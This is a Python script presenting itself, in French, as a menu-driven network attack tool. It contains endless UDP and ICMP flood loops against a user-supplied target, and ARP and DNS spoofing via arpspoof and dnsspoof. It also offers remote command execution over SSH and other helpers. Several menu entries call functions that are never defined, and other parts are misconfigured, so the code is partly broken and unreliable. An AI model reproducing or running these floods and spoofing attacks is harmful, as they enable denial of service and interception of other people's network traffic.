import os
import socket
import clear

# Function to perform a DNS Query Flood attack
def dns_query_flood(target_domain):
    print("Démarrage de l'attaque par inondation de requêtes DNS...")
    os.system(f"dnsenum -d {target_domain} -r 1000")

# Function to perform a UDP Flood attack
def udp_flood(target_ip, target_port):
    print("Démarrage de l'attaque par inondation UDP...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        sock.sendto(b"X" * 1024, (target_ip, target_port))

# Function to perform an ICMP Flood attack
def icmp_flood(target_ip):
    print("Démarrage de l'attaque par inondation ICMP...")
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_ICMP)
    while True:
        sock.sendto(b"X" * 64, (target_ip, 1))

# Function to perform port forwarding
def port_forwarding(local_port, remote_ip, remote_port):
    print(f"Démarrage du port forwarding de {local_port} vers {remote_ip}:{remote_port}...")
    os.system(f"ssh -L {local_port}:{remote_ip}:{remote_port} user@remote_host")

# Function to capture packets
def capture_packets(interface):
    print(f"Démarrage de la capture de paquets sur l'interface {interface}...")
    os.system(f"tcpdump -i {interface} -w capture.pcap")

# Function to create a simple HTTP server
def start_http_server(port):
    print(f"Démarrage du serveur HTTP sur le port {port}...")
    os.system(f"python3 -m http.server {port}")

# Function to execute a command on a remote machine
def execute_remote_command(remote_ip, command):
    print(f"Exécution de la commande sur {remote_ip}...")
    os.system(f"ssh user@{remote_ip} '{command}'")

# Function to perform ARP spoofing
def arp_spoofing(target_ip, gateway_ip):
    print(f"Démarrage de l'attaque ARP spoofing sur {target_ip} et {gateway_ip}...")
    os.system(f"arpspoof -t {target_ip} {gateway_ip}")

# Function to perform DNS spoofing
def dns_spoofing(target_ip, fake_ip):
    print(f"Démarrage de l'attaque DNS spoofing sur {target_ip} avec une adresse IP factice {fake_ip}...")
    os.system(f"dnsspoof -i {interface} -d {target_ip} {fake_ip}")

# Main program
def main():
    while True:
        clear.clear()
        print("Bienvenue dans l'outil d'attaque réseau !")
        print("Sélectionnez une attaque :")
        print("1. Spoofing DNS")
        print("2. Empoisonnement ARP")
        print("3. Saturation DHCP")
        print("4. Inondation TCP SYN")
        print("5. Inondation de requêtes DNS")
        print("6. Inondation UDP")
        print("7. Inondation ICMP")
        print("8. Port Forwarding")
        print("9. Capture de paquets")
        print("10. Démarrer un serveur HTTP")
        print("11. Exécuter une commande à distance")
        print("12. Spoofing ARP")
        print("13. Spoofing DNS")
        print("14. Quitter")

        choice = input("Entrez votre choix (1-14) : ")

        if choice == "1":
            dns_spoofing_attack()
        elif choice == "2":
            arp_poisoning_attack()
        elif choice == "3":
            dhcp_starvation_attack()
        elif choice == "4":
            target_ip = input("Entrez l'adresse IP cible : ")
            target_port = int(input("Entrez le port cible : "))
            tcp_syn_flood_attack(target_ip, target_port)
        elif choice == "5":
            target_domain = input("Entrez le domaine cible : ")
            dns_query_flood(target_domain)
        elif choice == "6":
            target_ip = input("Entrez l'adresse IP cible : ")
            target_port = int(input("Entrez le port cible : "))
            udp_flood(target_ip, target_port)
        elif choice == "7":
            target_ip = input("Entrez l'adresse IP cible : ")
            icmp_flood(target_ip)
        elif choice == "8":
            local_port = int(input("Entrez le port local : "))
            remote_ip = input("Entrez l'adresse IP distante : ")
            remote_port = int(input("Entrez le port distant : "))
            port_forwarding(local_port, remote_ip, remote_port)
        elif choice == "9":
            interface = input("Entrez le nom de l'interface (ex: wlan0) : ")
            capture_packets(interface)
        elif choice == "10":
            port = int(input("Entrez le port pour le serveur HTTP : "))
            start_http_server(port)
        elif choice == "11":
            remote_ip = input("Entrez l'adresse IP distante : ")
            command = input("Entrez la commande à exécuter : ")
            execute_remote_command(remote_ip, command)
        elif choice == "12":
            target_ip = input("Entrez l'adresse IP de la cible : ")
            gateway_ip = input("Entrez l'adresse IP de la passerelle : ")
            arp_spoofing(target_ip, gateway_ip)
        elif choice == "13":
            target_ip = input("Entrez l'adresse IP de la cible : ")
            fake_ip = input("Entrez l'adresse IP factice : ")
            dns_spoofing(target_ip, fake_ip)
        elif choice == "14":
            print("Au revoir !")
            break
        else:
            print("Choix invalide. Réessayez !")

        input("Appuyez sur Entrée pour continuer...")

if __name__ == '__main__':
    main()
